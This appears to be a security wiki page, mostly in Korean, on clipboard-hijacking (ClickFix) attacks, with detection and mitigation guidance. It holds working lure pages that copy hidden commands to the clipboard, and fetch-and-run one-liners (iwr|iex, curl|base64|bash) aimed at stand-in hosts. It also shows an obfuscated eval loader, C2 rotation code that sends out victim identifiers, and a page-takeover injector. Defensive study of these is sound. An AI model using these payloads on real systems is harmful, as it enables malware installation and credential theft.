# Clipboard Hijacking (Pastejacking) 공격

{{#include ../../banners/hacktricks-training.md}}

> "자신이 직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래된 조언이지만 여전히 유효하다

## 개요

Clipboard hijacking – 또한 *pastejacking*으로 알려진 이 기법은 사용자가 명령을 검사하지 않고 일상적으로 복사‑붙여넣기 하는 사실을 악용합니다. 악성 웹 페이지(또는 Electron이나 Desktop 애플리케이션처럼 JavaScript 실행이 가능한 모든 컨텍스트)는 프로그램적으로 공격자가 제어하는 텍스트를 시스템 클립보드에 넣습니다. 피해자는 보통 정교하게 구성된 social-engineering 지침에 따라 **Win + R**(실행 대화상자), **Win + X**(Quick Access / PowerShell)을 누르거나 터미널을 열고 클립보드 내용을 *paste* 하도록 유도되어 즉시 임의의 명령이 실행됩니다.

**파일이 다운로드되지 않고 첨부파일이 열리지 않기 때문에**, 이 기법은 첨부파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회합니다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer와 같은 범용 malware 계열을 배포하는 phishing 캠페인에서 인기가 있습니다.

## JavaScript 개념 증명(Proof-of-Concept)
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake 흐름

1. 사용자가 typosquatted 또는 침해된 사이트(예: `docusign.sa[.]com`)를 방문한다.
2. 주입된 **ClearFake** JavaScript는 `unsecuredCopyToClipboard()` 헬퍼를 호출하여 Base64-encoded PowerShell one-liner를 클립보드에 조용히 저장한다.
3. HTML 지침은 피해자에게 *“**Win + R**을 누르고, 명령을 붙여넣은 뒤 Enter를 눌러 문제를 해결하세요.”*라고 안내한다.
4. `powershell.exe`가 실행되어, 합법적인 실행파일과 악성 DLL을 포함한 아카이브를 다운로드한다(고전적인 DLL sideloading).
5. 로더는 추가 단계를 복호화하고, shellcode를 주입하며 persistence(예: scheduled task)를 설치한 뒤 궁극적으로 NetSupport RAT / Latrodectus / Lumma Stealer를 실행한다.

### NetSupport RAT 체인 예시
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 해당 디렉터리에서 `msvcp140.dll`을 찾는다.
* 악성 DLL은 **GetProcAddress**로 API를 동적으로 해석하고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드한 뒤 rolling XOR 키 `"https://google.com/"`로 복호화하고 최종 shellcode를 주입한 후 **client32.exe** (NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`로 압축 해제한다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt`을 **curl.exe**로 다운로드한다
2. **cscript.exe** 내에서 JScript downloader를 실행한다
3. MSI payload를 가져온 뒤 → `libcef.dll`을 서명된 애플리케이션 옆에 드롭한다 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 가져오고, `Boat.pst` (CAB)를 추출한 다음 `extrac32`와 파일 연결을 통해 `AutoIt3.exe`를 재구성하고 최종적으로 `.a3x` 스크립트를 실행해 브라우저 자격 증명을 `sumeriavgv.digital`로 exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 한 줄(one‑liner)을 붙여넣도록 지시하여 이를 지속화(persist)하고 C2를 매일 회전시킵니다. 관찰된 예시 체인:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
핵심 특징
- 표면적 검사를 무력화하기 위해 런타임에 역순으로 처리된 난독화된 URL.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 지속되며, 현재 날짜에 따라 C2를 선택함 — 빠른 domain rotation을 가능하게 함.

날짜에 따라 C2s를 로테이션하기 위해 사용된 최소 JS 코드 조각:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 일반적으로 loader를 배포하여 persistence를 확보하고 RAT(예: PureHVNC)을 가져온다. 종종 TLS를 하드코딩된 인증서에 고정하고 트래픽을 청크로 전송한다.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns mass-produce fake CDN/browser verification pages ("Just a moment…", IUAM-style) that coerce users into copying OS-specific commands from their clipboard into native consoles. This pivots execution out of the browser sandbox and works across Windows and macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 초기 실행 persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` 를 사용해 터미널이 닫힌 후에도 실행이 계속되도록 하여 눈에 띄는 흔적을 줄입니다.

손상된 사이트에서 In-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Clipboard API를 verification widgets에 바인딩하는 페이지; 표시된 텍스트와 클립보드 페이로드 간의 불일치; `navigator.userAgent`에 따른 분기; 의심스러운 맥락에서 Tailwind + single-page 교체.
- Windows endpoint: 브라우저 상호작용 직후 `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%`에서 실행되는 batch/MSI 인스톨러.
- macOS endpoint: Terminal/iTerm이 브라우저 이벤트 근처에서 `bash`/`curl`/`base64 -d`를 `nohup`으로 실행; 터미널 종료 후에도 백그라운드 작업이 살아남음.
- `RunMRU` Win+R 기록과 클립보드 쓰기 이벤트를 이후 콘솔 프로세스 생성과 연관지어 분석.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 완화 조치

1. 브라우저 하드닝 – 클립보드 쓰기 접근(`dom.events.asyncClipboard.clipboardItem` 등)을 비활성화하거나 사용자 제스처를 요구.
2. 보안 인식 – 사용자에게 민감한 명령어를 *입력*하게 하거나 먼저 텍스트 에디터에 붙여넣도록 교육.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control로 임의의 one-liners 차단.
4. 네트워크 제어 – 알려진 pastejacking 및 malware C2 도메인으로의 아웃바운드 요청 차단.

## 관련 트릭

* **Discord Invite Hijacking** 종종 사용자를 악성 서버로 유인한 뒤 동일한 ClickFix 방식을 악용합니다:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 참고자료

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
